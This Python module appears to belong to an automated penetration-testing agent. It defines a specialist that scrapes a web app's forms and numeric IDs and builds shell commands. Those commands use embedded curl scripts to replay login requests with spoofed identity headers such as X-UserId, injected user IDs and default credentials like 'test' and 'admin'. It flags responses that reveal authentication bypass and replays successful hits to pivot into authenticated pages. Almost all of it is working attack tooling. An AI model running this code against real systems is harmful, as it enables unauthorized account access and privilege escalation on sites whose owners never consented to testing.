from __future__ import annotations

import json
import re
from dataclasses import dataclass
from typing import Iterable, List
from urllib.parse import urljoin, urlparse

from penage.core.actions import Action, ActionType
from penage.core.candidates import CandidateAction
from penage.core.state import State
from penage.specialists.base import SpecialistConfig


_ID_RE = re.compile(r"\b\d{2,8}\b")

_IDENTITY_INPUT_HINTS = (
    "user_id",
    "userid",
    "uid",
    "account_id",
    "accountid",
    "profile_id",
    "profileid",
    "company_id",
    "companyid",
    "org_id",
    "orgid",
    "customer_id",
    "customerid",
    "member_id",
    "memberid",
)

_USERNAME_INPUT_HINTS = (
    "username",
    "login",
    "email",
)

_PASSWORD_INPUT_HINTS = (
    "password",
    "passwd",
    "pass",
)

_AUTH_ACTION_HINTS = (
    "login",
    "password",
    "auth",
    "signin",
    "session",
    "token",
)

_AUTH_TEXT_HINTS = (
    "login",
    "password",
    "welcome",
    "dashboard",
    "session",
    "token",
    "csrf",
    "profile",
    "account",
)

_DEFAULT_TARGETS = (
    "/dashboard",
    "/profile",
    "/account",
    "/orders",
    "/admin",
    "/token",
)

_DEFAULT_HEADER_CANDIDATES = (
    "X-UserId",
    "X-User-Id",
    "X-UID",
    "X-Account-Id",
    "X-Profile-Id",
    "X-Company-Id",
    "X-Org-Id",
)

_BLOCKED_EXT = (
    ".css",
    ".js",
    ".map",
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".svg",
    ".ico",
    ".woff",
    ".woff2",
    ".ttf",
    ".eot",
)

_POSITIVE_BODY_MARKERS = (
    "welcome",
    "dashboard",
    "logout",
    "profile",
    "orders",
    "account",
    "receipt",
)

_NEGATIVE_BODY_MARKERS = (
    "incorrect password",
    "invalid password",
    "login failed",
    "unauthorized",
    "forbidden",
)


def _sh_quote(s: str) -> str:
    return "'" + str(s).replace("'", "'\"'\"'") + "'"


def _best_context_text(st: State) -> str:
    best = getattr(st, "best_http_text_full", None)
    if isinstance(best, str) and best:
        return best

    last = getattr(st, "last_http_text_full", None)
    if isinstance(last, str) and last:
        return last

    return ""


def _looks_like_asset(path_or_url: str) -> bool:
    try:
        path = (urlparse(path_or_url).path or "").lower()
    except Exception:
        path = str(path_or_url or "").lower()

    if path.startswith("/static/"):
        return True
    return path.endswith(_BLOCKED_EXT)


def _collect_forms(st: State) -> list[dict[str, object]]:
    out: list[dict[str, object]] = []

    if isinstance(getattr(st, "last_forms", None), list):
        out.extend([x for x in st.last_forms if isinstance(x, dict)])

    best_url = str(getattr(st, "best_http_url", "") or "")
    if best_url:
        forms_by_url = getattr(st, "forms_by_url", {}) or {}
        maybe = forms_by_url.get(best_url) or []
        if isinstance(maybe, list):
            out.extend([x for x in maybe if isinstance(x, dict)])

    dedup: list[dict[str, object]] = []
    seen = set()
    for f in out:
        key = (str(f.get("method") or ""), str(f.get("action") or ""))
        if key in seen:
            continue
        seen.add(key)
        dedup.append(f)
    return dedup[:8]


def _is_identity_name(name: str) -> bool:
    low = name.lower().strip()
    return any(h in low for h in _IDENTITY_INPUT_HINTS)


def _is_username_name(name: str) -> bool:
    low = name.lower().strip()
    if _is_identity_name(low):
        return False
    return any(h in low for h in _USERNAME_INPUT_HINTS)


def _is_password_input(name: str, typ: str) -> bool:
    low_name = name.lower().strip()
    low_type = typ.lower().strip()
    return low_type == "password" or any(h in low_name for h in _PASSWORD_INPUT_HINTS)


def _extract_identity_inputs(forms: list[dict[str, object]]) -> list[str]:
    out: list[str] = []
    seen = set()

    for f in forms:
        inputs = f.get("inputs")
        if not isinstance(inputs, list):
            continue

        for inp in inputs:
            if not isinstance(inp, dict):
                continue
            name = str(inp.get("name") or "").strip()
            if not name:
                continue

            if _is_identity_name(name) and name not in seen:
                seen.add(name)
                out.append(name)

    return out[:8]


def _id_strength(x: str) -> tuple[int, int]:
    x = str(x).strip()
    if not x.isdigit():
        return (0, 0)
    n = len(x)
    if n >= 5:
        return (3, n)
    if n == 4:
        return (2, n)
    if n == 3:
        return (1, n)
    return (0, n)


def _extract_id_candidates(st: State, forms: list[dict[str, object]]) -> list[str]:
    ordered: list[str] = []
    seen = set()

    def push(x: str) -> None:
        x = str(x).strip()
        if not x or x in seen:
            return
        if not x.isdigit():
            return
        if int(x) <= 0:
            return
        if len(x) > 8:
            return
        seen.add(x)
        ordered.append(x)

    for f in forms:
        inputs = f.get("inputs")
        if not isinstance(inputs, list):
            continue
        for inp in inputs:
            if not isinstance(inp, dict):
                continue
            name = str(inp.get("name") or "")
            value = str(inp.get("value") or "").strip()
            if _is_identity_name(name):
                push(value)

    for x in st.page_ids[:20]:
        push(str(x))

    for x in list(getattr(st, "best_http_ids", []) or [])[:20]:
        push(str(x))

    text = _best_context_text(st)
    for m in _ID_RE.finditer(text):
        push(m.group(0))
        if len(ordered) >= 20:
            break

    strong = [x for x in ordered if _id_strength(x)[0] >= 2]
    medium = [x for x in ordered if _id_strength(x)[0] == 1]
    weak = [x for x in ordered if _id_strength(x)[0] == 0]

    if strong:
        return strong[:4]
    if medium:
        return medium[:4]
    return weak[:4]


def _collect_targets(st: State) -> list[str]:
    paths: list[str] = []
    seen = set()

    def push(path: str) -> None:
        if not isinstance(path, str):
            return
        p = path.strip()
        if not p:
            return
        if p.startswith("http://") or p.startswith("https://"):
            try:
                p = urlparse(p).path or "/"
            except Exception:
                return
        if not p.startswith("/"):
            p = "/" + p
        if p in seen:
            return
        if _looks_like_asset(p):
            return
        seen.add(p)
        paths.append(p)

    for p in list(getattr(st, "known_paths", []) or []):
        push(p)

    for p in _DEFAULT_TARGETS:
        push(p)

    priority = ["/dashboard", "/profile", "/account", "/orders", "/admin", "/token"]
    picked: list[str] = []
    picked_set = set()

    def take(p: str) -> None:
        if p in seen and p not in picked_set:
            picked.append(p)
            picked_set.add(p)

    for p in priority:
        take(p)

    scored: list[tuple[float, str]] = []
    for p in paths:
        if p in picked_set:
            continue
        score = 0.0
        low = p.lower()

        if low == "/":
            score -= 0.5
        if "dashboard" in low:
            score += 3.0
        if "profile" in low or "account" in low:
            score += 2.5
        if "orders" in low or "token" in low:
            score += 2.0
        if "admin" in low:
            score += 1.5
        if "company" in low or "user" in low or "job" in low:
            score += 1.0

        scored.append((score, p))

    scored.sort(key=lambda kv: (kv[0], len(kv[1])), reverse=True)

    for _, p in scored:
        if len(picked) >= 4:
            break
        take(p)

    return picked[:4]


def _header_variants(identity_inputs: Iterable[str]) -> list[str]:
    out: list[str] = []
    seen = set()

    def push(h: str) -> None:
        h = str(h).strip()
        if not h or h in seen:
            return
        seen.add(h)
        out.append(h)

    for h in _DEFAULT_HEADER_CANDIDATES:
        push(h)

    for name in identity_inputs:
        low = name.lower().strip()
        if not low:
            continue

        title = "-".join(part.capitalize() for part in re.split(r"[_\-\s]+", low) if part)
        compact = "".join(part.capitalize() for part in re.split(r"[_\-\s]+", low) if part)

        push(name)
        push(title)
        push("X-" + title)
        push("X-" + compact)

    return out[:4]


def _is_auth_form(form: dict[str, object]) -> bool:
    action = str(form.get("action") or "").lower()
    if any(h in action for h in _AUTH_ACTION_HINTS):
        return True

    inputs = form.get("inputs")
    if not isinstance(inputs, list):
        return False

    names = []
    types = []
    for inp in inputs:
        if not isinstance(inp, dict):
            continue
        names.append(str(inp.get("name") or ""))
        types.append(str(inp.get("type") or ""))

    if any(_is_password_input(n, t) for n, t in zip(names, types)):
        return True
    if any(_is_identity_name(n) for n in names):
        return True

    return False


def _collect_auth_form_specs(st: State) -> list[dict[str, object]]:
    forms = _collect_forms(st)
    specs: list[dict[str, object]] = []

    for form in forms:
        if not _is_auth_form(form):
            continue

        action = str(form.get("action") or "").strip()
        if not action or _looks_like_asset(action):
            continue

        raw_method = str(form.get("method") or "").upper().strip()
        inputs = form.get("inputs")
        if not isinstance(inputs, list):
            continue

        hidden_fields: dict[str, str] = {}
        identity_fields: list[str] = []
        username_fields: list[str] = []
        password_fields: list[str] = []

        for inp in inputs:
            if not isinstance(inp, dict):
                continue
            name = str(inp.get("name") or "").strip()
            if not name:
                continue

            typ = str(inp.get("type") or "").strip()
            value = str(inp.get("value") or "")

            if bool(inp.get("hidden")) or typ.lower() == "hidden":
                hidden_fields[name] = value

            if _is_identity_name(name):
                identity_fields.append(name)
                if value:
                    hidden_fields.setdefault(name, value)

            if _is_username_name(name):
                username_fields.append(name)
                if value:
                    hidden_fields.setdefault(name, value)

            if _is_password_input(name, typ):
                password_fields.append(name)
                if value:
                    hidden_fields.setdefault(name, value)

        if raw_method in {"POST", "PUT", "PATCH"}:
            method = raw_method
        elif password_fields or identity_fields or any(h in action.lower() for h in _AUTH_ACTION_HINTS):
            method = "POST"
        else:
            method = "GET"

        specs.append(
            {
                "method": method,
                "action": action,
                "hidden_fields": hidden_fields,
                "identity_fields": identity_fields[:4],
                "username_fields": username_fields[:3],
                "password_fields": password_fields[:2],
            }
        )

    dedup: list[dict[str, object]] = []
    seen = set()
    for s in specs:
        key = (str(s.get("method") or ""), str(s.get("action") or ""))
        if key in seen:
            continue
        seen.add(key)
        dedup.append(s)

    dedup.sort(key=lambda s: 0 if str(s.get("method") or "") == "POST" else 1)
    return dedup[:2]


def _username_candidates(form_specs: list[dict[str, object]]) -> list[str]:
    out: list[str] = []
    seen = set()

    def push(x: str) -> None:
        x = str(x).strip()
        if not x or x in seen:
            return
        seen.add(x)
        out.append(x)

    for spec in form_specs:
        hidden = spec.get("hidden_fields") or {}
        if not isinstance(hidden, dict):
            continue
        for k, v in hidden.items():
            if _is_username_name(str(k)):
                push(str(v))

    push("test")
    push("admin")
    return out[:2]


def _password_candidates(form_specs: list[dict[str, object]]) -> list[str]:
    out: list[str] = []
    seen = set()

    def push(x: str) -> None:
        x = str(x).strip()
        if x in seen:
            return
        seen.add(x)
        out.append(x)

    for spec in form_specs:
        hidden = spec.get("hidden_fields") or {}
        if not isinstance(hidden, dict):
            continue
        for k, v in hidden.items():
            if any(h in str(k).lower() for h in _PASSWORD_INPUT_HINTS):
                push(str(v))

    push("test")
    push("anything")
    return out[:2]


def _has_auth_signal(st: State, form_specs: list[dict[str, object]], id_candidates: list[str]) -> bool:
    if form_specs and id_candidates:
        return True

    text = _best_context_text(st).lower()
    if any(h in text for h in _AUTH_TEXT_HINTS) and id_candidates:
        return True

    last_url = str(getattr(st, "last_http_url", "") or "").lower()
    best_url = str(getattr(st, "best_http_url", "") or "").lower()
    for u in (last_url, best_url):
        if any(h in u for h in ("password", "login", "dashboard", "profile", "account", "token")) and id_candidates:
            return True

    return False


def _recent_auth_hits(st: State) -> list[dict[str, object]]:
    return [h for h in st.auth.confusion_last_hits_preview if isinstance(h, dict)]


def _best_recent_auth_hit(st: State) -> dict[str, object] | None:
    hits = _recent_auth_hits(st)
    if not hits:
        return None

    def score(hit: dict[str, object]) -> tuple[int, int]:
        improved = hit.get("improved_targets") or []
        n_improved = len(improved) if isinstance(improved, list) else 0
        set_cookie = 1 if bool(hit.get("set_cookie")) else 0
        dashboard = 1 if "/dashboard" in str(hit.get("post_location") or "") else 0
        return (n_improved + set_cookie + dashboard, n_improved)

    hits.sort(key=score, reverse=True)
    return hits[0] if hits else None


@dataclass(slots=True)
class AuthSessionConfusionSpecialist:
    name: str = "auth_session_confusion"

    max_runs: int = 4
    cooldown_steps: int = 4
    min_id_candidates: int = 1
    score: float = 29.5
    followup_score: float = 31.5

    def propose(self, state: State, *, config: SpecialistConfig) -> List[CandidateAction]:
        _ = config

        base_url = state.base_url
        if not base_url:
            return []

        if int(getattr(state, "tool_calls_sandbox", 0) or 0) <= 0:
            return []

        out: list[CandidateAction] = []

        followup = self._maybe_followup_from_hit(state, base_url=base_url)
        if followup is not None:
            out.append(followup)

        if state.auth.confusion_runs >= self.max_runs:
            return out

        curr_step = state.orch_step
        last_step = state.auth.confusion_last_step
        if curr_step and last_step and (curr_step - last_step) < self.cooldown_steps:
            return out

        all_forms = _collect_forms(state)
        form_specs = _collect_auth_form_specs(state)

        bad_form_actions = {str(x) for x in state.auth.confusion_bad_form_actions}
        if bad_form_actions:
            form_specs = [s for s in form_specs if str(s.get("action") or "") not in bad_form_actions]
        identity_inputs = _extract_identity_inputs(all_forms)
        id_candidates = _extract_id_candidates(state, all_forms)

        if not form_specs:
            return []

        if len(id_candidates) < self.min_id_candidates:
            return out

        if not _has_auth_signal(state, form_specs, id_candidates):
            return out

        headers = _header_variants(identity_inputs)
        targets = _collect_targets(state)
        usernames = _username_candidates(form_specs)
        passwords = _password_candidates(form_specs)

        if not headers or not targets or not form_specs:
            return out

        fp = (
            "authv4|"
            + "|".join(id_candidates)
            + "||"
            + "|".join(headers)
            + "||"
            + "|".join(targets)
            + "||"
            + "|".join(str(s.get("action") or "") for s in form_specs)
        )
        if fp == state.auth.confusion_last_fp:
            return out

        cmd = self._build_probe_shell_command(
            base_url=base_url,
            ids=id_candidates,
            headers=headers,
            targets=targets,
            form_specs=form_specs,
            usernames=usernames,
            passwords=passwords,
        )

        state.auth.confusion_last_fp = fp

        out.append(
            CandidateAction(
                action=Action(
                    type=ActionType.SHELL,
                    params={"command": cmd},
                    timeout_s=120,
                    tags=["sandbox", "auth", "session", "differential", "post_replay"],
                ),
                source=self.name,
                score=self.score,
                cost=3.0,
                reason=(
                    "batched POST replay + header/body identity differential probing "
                    "for auth/session confusion on stateful endpoints"
                ),
            )
        )

        return out

    def _maybe_followup_from_hit(self, state: State, *, base_url: str) -> CandidateAction | None:
        hit = _best_recent_auth_hit(state)
        if hit is None:
            return None

        curr_step = state.orch_step
        hit_step = state.auth.confusion_last_step
        if hit_step and curr_step and (curr_step - hit_step) > 8:
            return None

        fp = json.dumps(
            {
                "form_action": hit.get("form_action"),
                "header": hit.get("header"),
                "id": hit.get("id"),
                "username": hit.get("username"),
                "password": hit.get("password", ""),
                "post_location": hit.get("post_location"),
            },
            sort_keys=True,
            ensure_ascii=False,
        )
        if fp == state.auth.confusion_followup_last_fp:
            return None

        improved = hit.get("improved_targets") or []
        target_paths: list[str] = []
        if isinstance(improved, list):
            for item in improved[:3]:
                if not isinstance(item, dict):
                    continue
                p = str(item.get("path") or "").strip()
                if p:
                    target_paths.append(p)

        post_location = str(hit.get("post_location") or "").strip()
        if post_location and post_location.startswith("/") and post_location not in target_paths:
            target_paths.insert(0, post_location)

        if not target_paths:
            target_paths = ["/dashboard"]

        cmd = self._build_followup_shell_command(
            base_url=base_url,
            form_action=str(hit.get("form_action") or ""),
            header=str(hit.get("header") or "X-UserId"),
            ident=str(hit.get("id") or ""),
            username=str(hit.get("username") or "test"),
            password=str(hit.get("password") or "test"),
            target_paths=target_paths[:3],
        )

        state.auth.confusion_followup_last_fp = fp

        return CandidateAction(
            action=Action(
                type=ActionType.SHELL,
                params={"command": cmd},
                timeout_s=90,
                tags=["sandbox", "auth", "session", "followup", "differential"],
            ),
            source=self.name,
            score=self.followup_score,
            cost=2.6,
            reason="replay previously winning auth-confusion hit and pivot into authenticated state",
        )

    def _build_followup_shell_command(
        self,
        *,
        base_url: str,
        form_action: str,
        header: str,
        ident: str,
        username: str,
        password: str,
        target_paths: list[str],
    ) -> str:
        py = r"""
import json
import os
import subprocess
import tempfile
from urllib.parse import urlencode, urljoin, urlparse

base = os.sys.argv[1].rstrip("/")
form_action = os.environ["FORM_ACTION"]
header = os.environ["HEADER_NAME"]
ident = os.environ["IDENT"]
username = os.environ["USERNAME"]
password = os.environ["PASSWORD"]
targets = json.loads(os.environ["TARGETS_JSON"])

cookiejar = "/tmp/penage_followup_cookie.txt"

def run_curl(args, timeout=15):
    p = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, timeout=timeout, check=False)
    return p.stdout or ""

def parse_http(raw: str):
    if "\r\n\r\n" in raw:
        head, body = raw.split("\r\n\r\n", 1)
    elif "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
    else:
        head, body = raw, ""
    status = 0
    headers = {}
    for idx, line in enumerate(head.splitlines()):
        if idx == 0 and line.startswith("HTTP/"):
            parts = line.split()
            if len(parts) >= 2 and parts[1].isdigit():
                status = int(parts[1])
        elif ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers, body

post_url = form_action if form_action.startswith("http://") or form_action.startswith("https://") else urljoin(base + "/", form_action.lstrip("/"))
payload = urlencode({
    "username": username,
    "user_id": ident,
    "password": password,
})

post_raw = run_curl([
    "curl", "-sS", "-i",
    "-X", "POST",
    "-c", cookiejar,
    "-b", cookiejar,
    "-H", "Content-Type: application/x-www-form-urlencoded",
    "-H", f"{header}: {ident}",
    "--data", payload,
    post_url,
], timeout=15)
post_status, post_headers, post_body = parse_http(post_raw)

followups = []
paths = set()
for target in targets:
    url = urljoin(base + "/", str(target).lstrip("/"))
    raw = run_curl(["curl", "-sS", "-i", "-c", cookiejar, "-b", cookiejar, url], timeout=12)
    status, headers, body = parse_http(raw)
    followups.append({
        "path": target,
        "status": status,
        "location": headers.get("location", ""),
        "body_excerpt": body[:160],
    })
    paths.add(str(target))

out = {
    "paths": sorted(paths)[:20],
    "ids": [ident],
    "auth_followup": {
        "form_action": post_url,
        "header": header,
        "id": ident,
        "post_status": post_status,
        "post_location": post_headers.get("location", ""),
        "set_cookie": bool(post_headers.get("set-cookie")),
        "targets": followups[:6],
    },
    "stats": {
        "targets_total": len(targets),
    },
}
print(json.dumps(out, ensure_ascii=False))
""".strip()

        return (
            "set -euo pipefail\n"
            f"export FORM_ACTION={_sh_quote(form_action)}\n"
            f"export HEADER_NAME={_sh_quote(header)}\n"
            f"export IDENT={_sh_quote(ident)}\n"
            f"export USERNAME={_sh_quote(username)}\n"
            f"export PASSWORD={_sh_quote(password)}\n"
            f"export TARGETS_JSON={_sh_quote(json.dumps(target_paths, ensure_ascii=False))}\n"
            f"python - {_sh_quote(base_url)} <<'PY'\n{py}\nPY\n"
        )

    def _build_probe_shell_command(
        self,
        *,
        base_url: str,
        ids: list[str],
        headers: list[str],
        targets: list[str],
        form_specs: list[dict[str, object]],
        usernames: list[str],
        passwords: list[str],
    ) -> str:
        py = r"""
import copy
import json
import os
import shutil
import subprocess
import tempfile
from urllib.parse import urlencode, urljoin, urlparse

base = os.sys.argv[1].rstrip("/")
main_cookiejar = "/tmp/penage_cookies.txt"

ids = json.loads(os.environ["IDS_JSON"])
headers = json.loads(os.environ["HEADERS_JSON"])
targets = json.loads(os.environ["TARGETS_JSON"])
form_specs = json.loads(os.environ["FORM_SPECS_JSON"])
usernames = json.loads(os.environ["USERNAMES_JSON"])
passwords = json.loads(os.environ["PASSWORDS_JSON"])

OK = {200, 201, 202, 204, 301, 302, 303, 307, 308}
REDIRECTS = {301, 302, 303, 307, 308}
POSITIVE_BODY = ("welcome", "dashboard", "logout", "profile", "orders", "account", "receipt")
NEGATIVE_BODY = ("incorrect password", "invalid password", "login failed", "unauthorized", "forbidden")

def run_curl(args, timeout=15):
    p = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, timeout=timeout, check=False)
    return p.stdout or ""

def parse_http(raw: str):
    if "\r\n\r\n" in raw:
        head, body = raw.split("\r\n\r\n", 1)
    elif "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
    else:
        head, body = raw, ""
    status = 0
    headers = {}
    for idx, line in enumerate(head.splitlines()):
        if idx == 0 and line.startswith("HTTP/"):
            parts = line.split()
            if len(parts) >= 2 and parts[1].isdigit():
                status = int(parts[1])
        elif ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers, body

def positive_text(body: str):
    low = (body or "").lower()
    if any(x in low for x in NEGATIVE_BODY):
        return False
    return any(x in low for x in POSITIVE_BODY)

def baseline_get(target: str):
    url = urljoin(base + "/", target.lstrip("/"))
    raw = run_curl(["curl", "-sS", "-i", "-b", main_cookiejar, "-c", main_cookiejar, url], timeout=12)
    status, headers, body = parse_http(raw)
    return {
        "status": status,
        "location": headers.get("location", ""),
        "body_excerpt": body[:160],
        "positive_text": positive_text(body),
    }

baseline = {t: baseline_get(t) for t in targets}

hits = []
paths = set()
seen = set()

def make_cookiejar():
    fd, path = tempfile.mkstemp(prefix="penage_auth_", suffix=".txt")
    os.close(fd)
    if os.path.exists(main_cookiejar):
        try:
            shutil.copyfile(main_cookiejar, path)
        except Exception:
            pass
    return path

for spec in form_specs:
    method = str(spec.get("method") or "POST").upper()
    action = str(spec.get("action") or "")
    if not action:
        continue

    action_url = action if action.startswith("http://") or action.startswith("https://") else urljoin(base + "/", action.lstrip("/"))

    hidden_fields = spec.get("hidden_fields") or {}
    identity_fields = list(spec.get("identity_fields") or [])
    username_fields = list(spec.get("username_fields") or [])
    password_fields = list(spec.get("password_fields") or [])

    if not ids:
        continue

    use_usernames = usernames[:] if username_fields else [""]
    use_passwords = passwords[:] if password_fields else [""]

    for ident in ids:
        for hname in headers:
            for uname in use_usernames[:2]:
                for pwd in use_passwords[:2]:
                    key = (action_url, ident, hname, uname, pwd)
                    if key in seen:
                        continue
                    seen.add(key)

                    cookiejar = make_cookiejar()
                    try:
                        data = copy.deepcopy(hidden_fields)
                        for fld in identity_fields:
                            data[fld] = ident
                        for fld in username_fields:
                            if uname:
                                data[fld] = uname
                        for fld in password_fields:
                            if pwd:
                                data[fld] = pwd

                        encoded = urlencode({str(k): str(v) for k, v in data.items()}, doseq=False)

                        post_cmd = [
                            "curl", "-sS", "-i",
                            "-X", method,
                            "-b", cookiejar,
                            "-c", cookiejar,
                            "-H", "Content-Type: application/x-www-form-urlencoded",
                            "-H", f"{hname}: {ident}",
                            "--data", encoded,
                            action_url,
                        ]
                        post_raw = run_curl(post_cmd, timeout=15)
                        post_status, post_headers, post_body = parse_http(post_raw)

                        improved_targets = []
                        for target in targets[:3]:
                            url = urljoin(base + "/", target.lstrip("/"))
                            raw = run_curl(["curl", "-sS", "-i", "-b", cookiejar, "-c", cookiejar, url], timeout=12)
                            st, hdrs, body = parse_http(raw)
                            base_info = baseline.get(target) or {"status": 0, "location": "", "positive_text": False}
                            changed = (
                                (st != int(base_info.get("status") or 0))
                                or (hdrs.get("location", "") != str(base_info.get("location") or ""))
                                or (positive_text(body) and not bool(base_info.get("positive_text")))
                            )
                            if st in OK and changed:
                                improved_targets.append(
                                    {
                                        "path": target,
                                        "status": st,
                                        "location": hdrs.get("location", ""),
                                        "baseline_status": base_info.get("status"),
                                        "baseline_location": base_info.get("location"),
                                        "body_excerpt": body[:120],
                                    }
                                )

                        suspicious_post = (
                            post_status in REDIRECTS
                            or bool(post_headers.get("set-cookie"))
                            or bool(post_headers.get("location"))
                            or positive_text(post_body)
                        )

                        if suspicious_post or improved_targets:
                            hit = {
                                "form_action": action_url,
                                "header": hname,
                                "id": ident,
                                "username": uname,
                                "password_used": bool(pwd),
                                "password": pwd,
                                "post_status": post_status,
                                "post_location": post_headers.get("location", ""),
                                "set_cookie": bool(post_headers.get("set-cookie")),
                                "post_body_excerpt": post_body[:160],
                                "improved_targets": improved_targets[:5],
                            }
                            hits.append(hit)
                            for tgt in improved_targets:
                                p = tgt.get("path")
                                if p:
                                    paths.add(str(p))
                                loc = tgt.get("location") or ""
                                if loc:
                                    try:
                                        lp = urlparse(loc).path or loc
                                    except Exception:
                                        lp = loc
                                    if lp:
                                        paths.add(lp if str(lp).startswith("/") else ("/" + str(lp)))
                            loc = post_headers.get("location", "")
                            if loc:
                                try:
                                    lp = urlparse(loc).path or loc
                                except Exception:
                                    lp = loc
                                if lp:
                                    paths.add(lp if str(lp).startswith("/") else ("/" + str(lp)))

                        if len(hits) >= 30:
                            raise SystemExit

                    finally:
                        try:
                            os.remove(cookiejar)
                        except Exception:
                            pass

out = {
    "paths": sorted(paths)[:60],
    "ids": ids[:20],
    "auth_hits": hits[:30],
    "stats": {
        "hits_total": len(hits),
        "targets_total": len(targets),
        "headers_total": len(headers),
        "ids_total": len(ids),
        "forms_total": len(form_specs),
    },
}
print(json.dumps(out, ensure_ascii=False))
""".strip()

        return (
            "set -euo pipefail\n"
            f"export IDS_JSON={_sh_quote(json.dumps(ids, ensure_ascii=False))}\n"
            f"export HEADERS_JSON={_sh_quote(json.dumps(headers, ensure_ascii=False))}\n"
            f"export TARGETS_JSON={_sh_quote(json.dumps(targets, ensure_ascii=False))}\n"
            f"export FORM_SPECS_JSON={_sh_quote(json.dumps(form_specs, ensure_ascii=False))}\n"
            f"export USERNAMES_JSON={_sh_quote(json.dumps(usernames, ensure_ascii=False))}\n"
            f"export PASSWORDS_JSON={_sh_quote(json.dumps(passwords, ensure_ascii=False))}\n"
            f"python - {_sh_quote(base_url)} <<'PY'\n{py}\nPY\n"
        )